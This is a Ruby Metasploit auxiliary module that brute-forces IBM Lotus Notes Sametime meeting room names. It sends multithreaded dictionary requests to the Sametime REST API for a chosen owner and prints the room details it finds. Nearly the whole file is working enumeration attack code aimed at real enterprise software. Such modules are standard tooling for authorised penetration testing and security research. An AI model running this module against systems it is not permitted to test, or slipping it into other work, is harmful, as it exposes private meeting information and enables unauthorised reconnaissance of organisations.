##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'enumerable'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'      => 'IBM Lotus Notes Sametime Room Name Brute-Forcer',
      'Description'     => %q{
        This module brute forces Sametime meeting room names via the IBM
        Lotus Notes Sametime web interface
      },
      'Author'     =>
        [
          'kicks4kittens' # Metasploit module
        ],
      'License'     => BSD_LICENSE))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('OWNER', [ true,  'The owner to brute-force meeting room names for', '']),
        OptPath.new('DICT', [ true,  'The path to the userinfo script', '']),
        OptBool.new('FULLDATA', [ true, 'Output full meeting room data', true]),
        OptString.new('TARGETURI', [ true, 'Path to stmeetings', '/stmeetings/'])
      ], self.class)

    register_advanced_options(
      [
        OptInt.new('TIMING', [ true,  'Set pause between requests', 0]),
        OptInt.new('Threads', [ true,  'Number of test threads', 10])
      ], self.class)
  end

  def run

    print_status("Beginning IBM Lotus Notes Sametime Meeting Room Brute-force on #{peer}")
    print_status("Using owner: #{datastore['OWNER']}")

    # test for expected response code on non-existant meeting room name
    rval = Rex::Text.rand_text_alpha(64)
    uri = target_uri.path
    @reqpath = normalize_uri(uri, '/restapi')

    res = send_request_cgi({
      'uri'     =>  @reqpath,
      'method'  => 'GET',
      'ctype'   => 'text/html',
      'vars_get' => {
        'owner' => datastore['OWNER'],
        'permaName' => rval
        }
    })

    if not res
      print_error("No response from server #{peer}")
      return
    end

    if res.code == 404 and res.body =~ /Room does not exist/i
      vprint_status("Server responding to restapi requests as expected")
    else
      print_error("Unexpected response from server (#{res.code}). Quitting....")
      return
    end

    # create initial test queue and populate
    @test_queue = Queue.new
    @output_lock = false

    File.open(datastore['DICT']).each { |line| @test_queue.push(line.chomp) }
    print_status("Loaded #{@test_queue.length} values from dictionary")

    print_status("Beginning dictionary brute-force using (#{datastore['Threads']} Threads)")
    test_length = 1 # initial test length set

    while(not @test_queue.empty?)
      t = []
      nt = datastore['Threads'].to_i
      nt = 1 if nt == 0

      if @test_queue.length < nt
        # work around issue where threads not created as the queue isn't large enough
        nt = @test_queue.length
      end

      begin
        1.upto(nt) do
          t << framework.threads.spawn("Module(#{self.refname})-#{rhost}", false, @test_queue.shift) do |test_current|
            Thread.current.kill if not test_current

            res = make_request(test_current)

            if res and not res.code == 404
              # check response for user data
              check_response(res, test_current)
            elsif res and res.code == 404
              vprint_status("Room \"#{test_current}\" was not valid for owner #{datastore['OWNER']}")
            else
              print_error("No response from server when testing (#{test_current})")
            end
          end
        end
      t.each {|x| x.join }

      rescue ::Timeout::Error
      ensure
        t.each {|x| x.kill rescue nil }
      end
    end
  end

  def make_request(test_current)

    # make request and return response

    # Apply timing information
    if datastore['TIMING'] > 0
      Rex::sleep(datastore['TIMING'])
    end

    res = send_request_cgi({
      'uri'     =>  @reqpath,
      'method'  => 'GET',
      'ctype'   => 'text/html',
      'vars_get' => {
        'owner' => datastore['OWNER'],
        'permaName' => test_current
        }
    })

  end

  def check_response(res, test_current)

    # check the response for valid room information

    begin
      # check response exists AND that it validates as JSON before proceeding
      if res.code.to_i == 200 and not JSON.parse(res.body).blank?
        # successful response - extract room information
        extract_room_data(res, test_current)
        return true
      elsif res.body =~ /Room does not exist/i
        return false
      else
        print_error("Unexpected response received from server #{peer}")
      end
    rescue JSON::ParserError
      # non-JSON response - server may be overloaded
      return
    end
  end

  def extract_room_data(res, test_current)

    # extract room data if not already present
    begin
      roominfo = JSON.parse(res.body)
      output_table(roominfo, test_current)
    rescue JSON::ParserError
      print_error("Error reading JSON string, continuing")
    end

  end

  def output_table(roominfo, test_current)

    if datastore['FULLDATA']

      # print output table for discovered meeting rooms

      roomtbl = Msf::Ui::Console::Table.new(
        Msf::Ui::Console::Table::Style::Default,
          'Header' => "[IBM Lotus Sametime] Meeting Room #{test_current}",
          'Prefix' => "",
          'Postfix' => "\n",
          'Indent' => 1,
          'Columns' =>[
            "Key",
            "Value"
            ])

      roominfo['results'][0].each do | k,v |
          if v.is_a?(Hash)
            # breakdown Hash
            roomtbl << [ k.to_s, '>>' ] # title line
            v.each do | subk, subv |
              roomtbl << [ "#{k.to_s}:#{subk.to_s}", subv.to_s || "-"]  if not v.nil? or v.empty?
            end
          else
            roomtbl << [ k.to_s, v.to_s || "-"]  if not v.nil?
          end
      end
      # output table
      print_good(roomtbl.to_s)

    else
      print_good("New meeting room found: #{test_current}")
    end


  end

end
